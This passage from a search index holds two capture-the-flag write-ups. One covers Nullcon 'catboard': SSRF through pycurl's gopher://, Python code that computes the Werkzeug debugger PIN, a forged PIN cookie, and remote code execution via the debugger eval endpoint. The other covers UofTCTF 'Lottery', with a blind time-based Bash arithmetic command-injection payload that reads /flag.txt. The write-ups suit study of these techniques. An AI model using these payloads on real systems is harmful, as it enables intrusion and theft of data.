(internal)","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#key-discoveries","title":"Key Discoveries","text":"<ul> <li>Internal port is 5000 (not 5004 \u2014 there's a reverse proxy)</li> <li><code>/flag.txt</code> and <code>/readflag</code> exist at filesystem root but are permission-restricted</li> <li>The app runs as <code>ctfplayer</code> (uid 1000), so <code>file:///flag.txt</code> returns \"Couldn't open file\"</li> <li><code>/readflag</code> is a SUID binary \u2014 I needed RCE to execute it</li> </ul>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-5-accessing-the-werkzeug-debugger-console","title":"Step 5: Accessing the Werkzeug Debugger Console","text":"<p>The Werkzeug debugger console at <code>/console</code> is blocked by the custom middleware for external requests. However, SSRF from localhost bypasses the IP check (the middleware only blocks non-private IPs):</p> <pre><code>POST /fetch  url=http://127.0.0.1:5000/console\n\u2192 200 OK \u2014 Full Werkzeug console page!\n</code></pre> <p>From the console HTML, I extracted the debugger SECRET: <code>aBCCW9bJLfWo4mtzFwSn</code></p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-6-calculating-the-werkzeug-debugger-pin","title":"Step 6: Calculating the Werkzeug Debugger PIN","text":"<p>The Werkzeug debugger PIN is derived from:</p> <p>Public bits: <code>[username, modname, appname, flask_module_path]</code> Private bits: <code>[str(uuid.getnode()), get_machine_id()]</code></p> <p>Using the leaked system data:</p> Parameter Value <code>username</code> <code>ctfplayer</code> (from <code>getpass.getuser()</code>, confirmed via <code>/etc/passwd</code> UID 1000) <code>modname</code> <code>flask.app</code> <code>appname</code> <code>Flask</code> (<code>type(app).__name__</code>) <code>flask_path</code> <code>/usr/local/lib/python3.11/site-packages/flask/app.py</code> <code>uuid.getnode()</code> <code>112644713822515</code> (from eth0 MAC <code>66:73:24:27:39:33</code>) <code>get_machine_id()</code> <code>b\"c8f5e9d2a1b3c4d5e6f7a8b9c0d1e2f3\"</code> (machine-id only; cgroup <code>0::/</code> adds nothing in this werkzeug version) <p>The PIN computation follows werkzeug 3.1.5's algorithm:</p> <pre><code>h = hashlib.sha1()\nfor bit in [username, modname, appname, flask_path, str(mac_int), machine_id]:\n    if isinstance(bit, str): bit = bit.encode()\n    h.update(bit)\nh.update(b\"cookiesalt\")\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\nh.update(b\"pinsalt\")\nnum = f\"{int(h.hexdigest(), 16):09d}\"[:9]\npin = f\"{num[:3]}-{num[3:6]}-{num[6:]}\"\n</code></pre> <p>Computed PIN: <code>171-165-093</code></p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-7-bypassing-the-middlewares-pin-auth-block","title":"Step 7: Bypassing the Middleware's PIN Auth Block","text":"<p>The middleware intercepts <code>pinauth</code> commands and always returns <code>{\"auth\": false}</code>, preventing normal PIN authentication. However, I could forge the PIN cookie directly without going through <code>pinauth</code>:</p> <pre><code># Cookie format: timestamp|hash_pin(pin)\npin_hash = hashlib.sha1(f\"{pin} added salt\".encode()).hexdigest()[:12]\ncookie_value = f\"{int(time.time())}|{pin_hash}\"\n# \u2192 __wzd8fe6343c0faf4f031d62=1738959726|446325dec3ec\n</code></pre>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#step-8-rce-via-gopher-werkzeug-eval","title":"Step 8: RCE via Gopher + Werkzeug Eval","text":"<p>The <code>__debugger__</code> eval endpoint requires: 1. A valid frame (<code>frm=0</code> \u2014 only exists after <code>/console</code> is visited) 2. The correct debugger SECRET 3. A valid PIN cookie (<code>check_pin_trust()</code> must return <code>True</code>)</p> <p>Since pycurl supports <code>gopher://</code>, I could craft raw HTTP requests with arbitrary cookies:</p> <pre><code>1. Visit /console via SSRF (creates frame 0)\n   POST /fetch  url=http://127.0.0.1:5000/console\n\n2. Execute code via gopher:// with forged PIN cookie\n   POST /fetch  url=gopher://127.0.0.1:5000/_GET%20/__debugger__?...\n   (with Cookie header containing the forged PIN cookie)\n</code></pre> <p>The gopher payload constructs a raw HTTP GET request to <code>/__debugger__</code> with our forged cookie:</p> <pre><code>GET /__debugger__?__debugger__=yes&amp;cmd=&lt;PYTHON_CODE&gt;&amp;frm=0&amp;s=&lt;SECRET&gt; HTTP/1.1\nHost: 127.0.0.1:5000\nCookie: __wzd8fe6343c0faf4f031d62=1738959726|446325dec3ec\nConnection: close\n</code></pre>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#getting-the-flag","title":"Getting the Flag","text":"<pre><code>cmd = \"__import__('os').popen('/readflag').read()\"\n</code></pre> <p>This executes the SUID <code>/readflag</code> binary, which reads the permission-restricted <code>/flag.txt</code> and returns the flag.</p>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#attack-chain-summary","title":"Attack Chain Summary","text":"<pre><code>Obfuscated source \u2192 Decode routes &amp; secret key generation\n         \u2193\nRandomWords wordlist \u2192 flask-unsign bruteforce \u2192 Secret: \"brownistical\"\n         \u2193\nForge admin session cookie {is_admin: True}\n         \u2193\nAccess /fetch admin endpoint \u2192 SSRF via pycurl\n         \u2193\nfile:// reads \u2192 Leak machine-id, MAC, username, container ID\n         \u2193\nSSRF to http://127.0.0.1:5000/console \u2192 Get debugger SECRET + create frame 0\n         \u2193\nCompute Werkzeug PIN + forge PIN auth cookie\n         \u2193\ngopher:// SSRF \u2192 Raw HTTP with PIN cookie \u2192 __debugger__ eval \u2192 /readflag \u2192 FLAG\n</code></pre>","tags":["web","nullconctf"]},{"location":"nullconctf/catboard/#tools-used","title":"Tools Used","text":"<ul> <li><code>flask-unsign</code> \u2014 Flask session cookie cracking and forging</li> <li><code>pycurl</code> (server-side) \u2014 SSRF with <code>file://</code> and <code>gopher://</code> protocol support</li> <li>Python <code>hashlib</code> \u2014 Werkzeug PIN computation</li> <li>Manual code analysis \u2014 Deobfuscating the meow-ified source code</li> </ul>","tags":["web","nullconctf"]},{"location":"uofctf/","title":"UofTCTF","text":"<p>This section contains my UofTCTF writeups.</p>"},{"location":"uofctf/misc/","title":"Writeup: UofTCTF Lottery Challenge","text":"<p>Category: Pwn / Jail</p> <p>Difficulty: Medium-Hard</p> <p>Method: Blind Time-Based Command Injection via Bash Arithmetic Evaluation</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#1-initial-discovery","title":"1. Initial Discovery","text":"<p>The challenge presents a \"Lottery\" service over a raw TCP connection. When I connected, I had to solve a Proof-of-Work (PoW) challenge from <code>pwn.red</code>. This is a rate-limiting mechanism to prevent automated spamming of the server.</p> <p>After solving the PoW, the server prompts:</p> <p>Guess the winning ticket (hex):</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#2-vulnerability-analysis","title":"2. Vulnerability Analysis","text":"<p>The input field is vulnerable to Bash Arithmetic Expansion. In many CTF challenges involving \"calculators\" or \"hex guesses\" written in Bash, user input is passed directly into an arithmetic context like <code>(( input ))</code> or <code>$(( input ))</code>.</p> <p>In Bash, arithmetic contexts are surprisingly powerful:</p> <ul> <li>Variable Assignment: You can manipulate environment variables (e.g., <code>PATH=0</code>).</li> <li>Comma Operator: You can chain multiple expressions together.</li> <li>Command Substitution: You can execute arbitrary shell commands using <code>$(...)</code>.</li> </ul>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#the-proof-of-concept-poc","title":"The Proof of Concept (PoC)","text":"<p>By sending <code>0, PATH=0</code>, I got the server to crash with the following error: <code>/app/run: line 14: head: command not found</code></p> <p>This confirmed that:</p> <ol> <li>The backend is a Bash script.</li> <li>Our input is being evaluated, allowing us to overwrite variables.</li> <li>Standard Error (stderr) is visible, though Standard Output (stdout) is suppressed.</li> </ol>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#3-exfiltration-strategy","title":"3. Exfiltration Strategy","text":"<p>Attempts to read the flag directly via <code>cat /flag.txt</code> failed to produce output. Attempts to redirect output to the parent process's file descriptors (<code>&gt; /proc/$PPID/fd/1</code>) also failed, likely due to containerization restrictions.</p> <p>Because I could not see the output, I switched to a Blind Time-Based Attack.</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#the-challenge-no-sleep","title":"The Challenge: No <code>sleep</code>","text":"<p>A typical timing attack relies on the <code>sleep</code> command. However, this environment was a minimal Docker container where <code>/bin/sleep</code> was not installed.</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#the-solution-cpu-busy-loop","title":"The Solution: CPU Busy Loop","text":"<p>To create a detectable delay, I used a Bash-native <code>for</code> loop. If a condition (for example, \"Is the first character of the flag 'u'?\" ) is true, the server executes a loop counting to 3,000,000, which consumes roughly 2 seconds of CPU time.</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#4-the-exploit-logic","title":"4. The Exploit Logic","text":"<p>I used Binary Search to find each character of the flag efficiently. Instead of checking every ASCII character linearly (1 to 127), binary search allows me to find a character in approximately 7 requests.</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#the-payload-structure","title":"The Payload Structure","text":"<pre><code>0, a[$(if [ $(head -c {index} /flag.txt | tail -c 1 | od -An -t u1) -gt {mid} ]; then for ((i=0;i&lt;3000000;i++)); do :; done; fi)]\n</code></pre> <ul> <li><code>head -c {index} /flag.txt | tail -c 1</code>: Isolates the character at a specific position.</li> <li><code>od -An -t u1</code>: Converts that character to its decimal ASCII value (e.g., 'u' becomes <code>117</code>).</li> <li><code>-gt {mid}</code>: Compares the value for the binary search.</li> <li><code>for...done</code>: The \"Busy Loop\" that creates a detectable timing delay if the condition is met.</li> </ul>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#5-optimization-threading","title":"5. Optimization: Threading","text":"<p>Solving the PoW for every guess is the main bottleneck, taking ~10 seconds per request. A single-threaded solver would take hours to retrieve a 40-character flag.</p> <p>I implemented a Threaded Solver using Python\u2019s <code>ThreadPoolExecutor</code>. By running 4 parallel workers, I could process 4 characters (or 4 binary search steps) simultaneously, drastically reducing the total time.</p>","tags":["pwn","jail","uoftctf"]},{"location":"uofctf/misc/#6-execution-and-final-flag","title":"6. Execution and Final Flag","text":"<p>The solver extracted the flag character by character. The final flag revealed a self-aware pun on the \"Lottery\" theme:</p> <p>Final Flag: <code>uoftctf{you_won_the_LETtery_(hahahaha_get_it?)}</code></p>","tags":["pwn","jail","uoftctf"]}]}